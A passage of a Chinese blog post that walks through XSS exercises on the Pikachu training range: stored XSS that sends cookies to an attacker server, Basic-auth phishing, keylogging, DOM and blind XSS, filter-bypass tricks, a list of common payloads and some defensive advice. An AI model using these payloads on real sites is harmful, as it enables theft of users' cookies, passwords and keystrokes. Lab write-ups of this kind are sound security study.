+<h4 id="案例一：利用留言js脚本，盗取cookie"><a href="#案例一：利用留言js脚本，盗取cookie" class="headerlink" title="案例一：利用留言js脚本，盗取cookie"></a>案例一：利用留言js脚本，盗取cookie</h4><p>那么攻击者在服务器上留言一个恶意代码，当受害者访问留言板的时候，就会自动执行并提交。下面进行实验</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.location = &#x27;http://192.168.177.1/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交后，当受害者访问留言板时，就自动执行了恶意代码，被攻击。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128224142834.png" alt="image-20211128224142834"></p>
+<h4 id="案例二：xss-钓鱼"><a href="#案例二：xss-钓鱼" class="headerlink" title="案例二：xss+钓鱼"></a>案例二：xss+钓鱼</h4><blockquote>
+<p> 我们这里<strong>用一个Basic认证去做这个钓鱼攻击</strong></p>
+<p>我们在一个<strong>存在XSS漏洞的页面上面嵌入一个恶意请求</strong>，当用户打开这个页面时</p>
+<p> 这个页面就会像攻击者的服务器发送请求，这个请求会返回一个Basic认证的头部</p>
+<p> 这时候会弹出一个提示框，要求受害者输入账号密码，从而盗取用户的账号密码</p>
+</blockquote>
+<p>首先，攻击者需要构造一个钓鱼页面，用来发送Basic认证的输入框</p>
+<p>这里就直接用现成的。修改/pikachu-master/pkxss/xfish/fish.php文件</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128230045244.png" alt="image-20211128230045244"></p>
+<p>构造Payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.177.1/pikachu-master/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p>当受害者访问留言板：</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128230444152.png" alt="image-20211128230444152"></p>
+<p>可是实验到这里，出了问题。受害者在输入了账号密码之后，还一直在弹窗。而且数据也没反弹给攻击机，这就有点疑惑了。后面我看了这篇文章才知道原因。。原因出现在了PHPstudy这个环境。详情看<a target="_blank" rel="noopener" href="https://www.sohu.com/a/375886707_354899">文章</a></p>
+<p>后面我修改了实验环境。如下：</p>
+<blockquote>
+<p>攻击者：192.168.79.132(kali)</p>
+<p>受害者：192.168.123.169(windows)</p>
+<p>有漏洞的服务器:192.168.79.133(ubantu)</p>
+</blockquote>
+<p>修改攻击机的xfish.php</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211129212631252.png" alt="image-20211129212631252"></p>
+<p>在服务器上留言payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.79.132:9002/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211129212510260.png" alt="image-20211129212510260"></p>
+<h4 id="案例三：键盘记录"><a href="#案例三：键盘记录" class="headerlink" title="案例三：键盘记录"></a>案例三：键盘记录</h4><p>实验前，先了解一下什么是跨域：</p>
+<blockquote>
+<p> 1.当协议、主机（主域名、子域名）、端口中的任意一个不同时，称为不同域</p>
+<p>2.我们把不同域之间请求数据的操作，称为跨域操作</p>
+</blockquote>
+<p><strong>同源策略：</strong></p>
+<p>为了安全考虑，所有的浏览器都约定了“同源策略”。同源策略规定：</p>
+<ul>
+<li><p>两个<strong>不同域</strong>之间<strong>不能使用JS进行互相操作</strong></p>
+<p>比如：x.com 域名下的 JS 并不能操作 y.com 域下的对象</p>
+<p>如果想要跨域操作，则需要管理员进行特殊配置</p>
+<p>比如<strong>通过头里面：header(“Access-Control-Allow-Origin:x/com”) 指定跨域的地址</strong></p>
+<p>下面的标签<strong>跨域加载资源（资源类型时有限制的）</strong>是<strong>不受同源策略限制</strong>的</p>
+</li>
+<li><p>&lt;script src=”…”&gt;，JS加载到本地执行</p>
+</li>
+<li><p>&lt;img src=”..”&gt;，图片</p>
+</li>
+<li><p>&lt;link href=”..”&gt;，CSS</p>
+</li>
+<li><p>&lt;iframe src=”..”&gt;，任意资源</p>
+</li>
+</ul>
+<p><strong>为什么要同源策略</strong>？</p>
+<p>  A登录了淘宝，攻击者向A发送了一个恶意链接http://盗取cookie</p>
+<p>  如果没有同源策略，url上的js恶意操作A的内容</p>
+<p>  有了同源策略，就限制了这种状况</p>
+<p>  或者，一个恶意站点A使用了 &lt;iframe src=”B站点登录界面”&gt; ，发送该恶意 url 给受害者</p>
+<p>  如果受害者浏览器如果没有同源策略，那么 A 上的 JS 即可获取 B 站点的登录信息</p>
+<p><strong>下面进行实验演示：</strong></p>
+<blockquote>
+<p>攻击机：ubantu:192.168.79.133:90002</p>
+<p>受害者：Windows:192.168.123.169</p>
+</blockquote>
+<p>修改pkxss/rkeypress下的rk.js的ip地址</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205135450449.png" alt="image-20211205135450449"></p>
+<p>并在存储型xss中留下恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src= &quot;http://192.168.79.133:9002/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>受害者访问<a target="_blank" rel="noopener" href="http://192.168.79.133:9002/vul/xss/xss_stored.php%E6%97%B6,%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E7%9B%B4%E5%9C%A8%E6%8A%A5%E9%94%99">http://192.168.79.133:9002/vul/xss/xss_stored.php时,打开控制台就可以看到一直在报错</a></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205135744562.png" alt="image-20211205135744562"></p>
+<p>但是输入的东西已经在攻击机上了.</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205135807780.png" alt="image-20211205135807780"></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205135821250.png" alt="image-20211205135821250"></p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>首先，得了解什么是DOM？</p>
+<p>我的理解就是，DOM为我们访问和操作HTML所有元素提供入口。</p>
+<p>官方解释：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/js/js_htmldom.asp">https://www.w3school.com.cn/js/js_htmldom.asp</a></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130223657118.png" alt="image-20211130223657118"></p>
+<p>在pikachu靶场DOM型XSS实验一下：</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130223756089.png" alt="image-20211130223756089"></p>
+<p>可以看到，前面的东西被吞了。看一下源码，发现前端有一个函数对我们的输入进行处理：</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130223903239.png" alt="image-20211130223903239"></p>
+<p>功能就是将我们在输入框里输入的内容拼接进a标签的href属性里面。我们可控的就是这个str。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130224156593.png" alt="image-20211130224156593"></p>
+<p>那么我们就可以输入一个单引号&#39;闭合前面的单引号，逃逸出href属性。后面就能实现我们想要的代码比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;alert(&#x27;xss&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后在后面加一个&gt;，闭合前面的a标签。最终形成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130224455424.png" alt="image-20211130224455424"></p>
+<p>点击蓝色字体就可以实现入侵。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211130224521976.png" alt="image-20211130224521976"></p>
+<p>造成DOM型XSS的原因是前端的输入被DOM给获取到了，通过DOM又在前端输出，<strong>跟反射型和存储型比起来，它是不经过后台交互的</strong></p>
+<h3 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h3><p>分析源码,有一个domxss方法</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205140638219.png" alt="image-20211205140638219"></p>
+<p>功能就是,从url中获取内容赋值给str.</p>
+<p>然后经过经过url解码和分隔,取出url中参数的内容</p>
+<p>再将内容的+号替换为空,赋值给xss变量</p>
+<p>最后将xss变量拼接进id为dom的标签中</p>
+<p>这个和前面的DOM型XSS很像,只是获取输入数据的方式不同.这个是从URL中获取输入内容,构造的Payload跟刚才是一样的.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205141105893.png" alt="image-20211205141105893"></p>
+<h3 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h3><p>XSS盲打是一个攻击场景.我们在输入内容时,发现输入的内容并不会返回在前端显示.那么我们就猜测,输入的内容会输入保存在后端,当管理员登录后台,打开查看的时候可能会遭到我们的XSS攻击.</p>
+<p>实验开始:</p>
+<p>我们在输入框内输入恶意代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;chickenmushroom&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当管理员登录后台查看的时候,就被攻击了</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.133:9002/vul/xss/xssblind/admin.php">http://192.168.79.133:9002/vul/xss/xssblind/admin.php</a></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205141452588.png" alt="image-20211205141452588"></p>
+<h3 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h3><p>真实场景中,或多或少都会对输入的内容进行过滤防护.那么我们应该怎样绕过过滤呢?</p>
+<p>通常的思路:</p>
+<h4 id="转换绕过思路"><a href="#转换绕过思路" class="headerlink" title="转换绕过思路:"></a>转换绕过思路:</h4><ul>
+<li>前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。</li>
+<li>大小写，比如&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</li>
+<li>双写（拼凑），&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;。后台可能把&lt;script&gt;标签去掉换，但可能只去掉一次。</li>
+<li>注释干扰，&lt;scri&lt;!–test–&gt;pt&gt;alert(111)&lt;/sc&lt;!–test–&gt;ript&gt;。加上注释后可能可以绕过后台过滤机制。</li>
+</ul>
+<h4 id="编码绕过思路"><a href="#编码绕过思路" class="headerlink" title="编码绕过思路:"></a>编码绕过思路:</h4><ul>
+<li>后台过滤了特殊字符，比如<script>标签，但该标签可以被各种编码，后台不一定过滤</li>
+<li>当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行</li>
+</ul>
+<p><strong>编码应该在输出点被正常识别和翻译，不能随便使用编码。</strong></p>
+<p>例子：</p>
+<blockquote>
+<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行URL编码，可以执行吗？&lt;img src=x onerror=alert%28%27xss%27%29&gt;</p>
+</blockquote>
+<blockquote>
+<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行HTML编码&lt;img  src=x  onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&gt;</p>
+</blockquote>
+<p>  XSS绕过的姿势很多，取决于你的思路和对前端技术的掌握程度</p>
+<p>  我们在皮卡丘平台上，输入下面的内容看一下后台会怎么处理</p>
+<p><strong>下面进行实验:</strong></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205142350687.png" alt="image-20211205142350687"></p>
+<p>可以看到,对&lt;script&gt;标签进行了过滤.尝试大小写绕过:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(&#x27;chickenmushroom&#x27;)&lt;/sCRIpt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205142453380.png" alt="image-20211205142453380"></p>
+<p>可见后端只是过滤了小写</p>
+<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p>首先了解一下什么是htmlspecialchars:</p>
+<p> htmlspecialchars()是PHP里面<strong>把预定义的字符转换为HTML实体的函数</strong></p>
+<p>  预定义的字符是</p>
+<ul>
+<li><p>&amp; 成为 &amp;amp</p>
+</li>
+<li><p>“ 成为 &amp;quot</p>
+</li>
+<li><p>‘ 成为 &amp;#039</p>
+</li>
+<li><p>&lt; 成为 &amp;lt</p>
+</li>
+<li><p>&gt; 成为 &amp;gt</p>
+<p>可用引号类型</p>
+</li>
+<li><p>ENT_COMPAT：默认，仅编码双引号</p>
+</li>
+<li><p>ENT_QUOTES：编码双引号和单引号</p>
+</li>
+<li><p>ENT_NOQUOTES：不编码任何引号</p>
+</li>
+</ul>
+<p>下面开始实验:</p>
+<p>输入敏感字符,看看会有什么反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;chickenmushroom</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205142839238.png" alt="image-20211205142839238"></p>
+<p>可以看到,我们输入的双引号,左尖括号,右尖括号都被编码了,但是单引号却没有被编码.那么我们就可以用单引号闭合前面的href的单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;chickenmushroom&#x27;) &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205143049221.png" alt="image-20211205143049221"></p>
+<h3 id="XSS常见防范措施"><a href="#XSS常见防范措施" class="headerlink" title="XSS常见防范措施"></a>XSS常见防范措施</h3><p>总的原则：<strong>输入做过滤，输出做转义</strong></p>
+<ul>
+<li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字</li>
+<li>转义：所有输出到前端的数据根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面进行JS转义</li>
+</ul>
+<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>分析一下xss_03.php的源码</p>
+<p>贴上关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们输入的内容赋值给message,然后如果我们输入的是<a target="_blank" rel="noopener" href="http://www.baidu.com,就会弹出-----我靠,我真想不到你是这样的一个人/">www.baidu.com,就会弹出-----我靠,我真想不到你是这样的一个人</a></p>
+<p>当我们输入的不是<a target="_blank" rel="noopener" href="http://www.baidu.com就会对我们输入的内容用htmlspecialchars()函数进行过滤,会将单双引号以及左右尖括号转义.然后输出到/">www.baidu.com就会对我们输入的内容用htmlspecialchars()函数进行过滤,会将单双引号以及左右尖括号转义.然后输出到</a> a 标签的 href 属性中，在 a 标签的href属性中，可以用javascript协议来执行JS</p>
+<p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#x27;chickenmushroom&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205144136933.png" alt="image-20211205144136933"></p>
+<p>如果要<strong>对 href 做处理</strong>，一般有两个逻辑：</p>
+<ul>
+<li>输入的时候只允许 http 或 https 开头的协议，才允许输出</li>
+<li>其次再进行htmlspecialchars处理</li>
+</ul>
+<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>随便输入一点东西’132’.然后查看一下源码</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205144343117.png" alt="image-20211205144343117"></p>
+<p>可以看到,这里有个js脚本对我们的输入内容进行判断.</p>
+<p>我们可控的变量就是这个$ms.那么我们可以传入一个单引号一个&lt;/script&gt;闭合掉前面的&lt;script&gt;</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205144934627.png" alt="image-20211205144934627"></p>
+<p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;chickenmushroom&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211205145101476.png" alt="image-20211205145101476"></p>
+<p> 这个漏洞的输出点是在JS中，通过用户的输入动态生成了JS代码 </p>
+<p>JS有个特点，它不会对实体编码进行解释，如果想要用htmlspecialchars对我们的输入做实体编码处理的话</p>
+<p>在JS中不会把它解释会去，这样解决了XSS问题，但不能构成合法的JS </p>
+<p>所以在JS的输出点应该对应该使用 \ 对特殊字符进行转义</p>
+<h3 id="xss常见payload"><a href="#xss常见payload" class="headerlink" title="xss常见payload"></a>xss常见payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(111)&gt;</span><br><span class="line">&lt;body onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;div onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>更多的参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuehen/p/4814237.html">https://www.cnblogs.com/xuehen/p/4814237.html</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/" title="Pikachu靶场之XSS" target="_blank" rel="external">http://example.com/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">chickenmushroom</span><small class="ml-1x">Web</small></a></h3>
+        <div>平平无奇的小红帽。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/10/24/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/" title="(no title)"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2021/08/04/%E5%8F%8D%E5%BC%B9Shell/" title="反弹shell"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
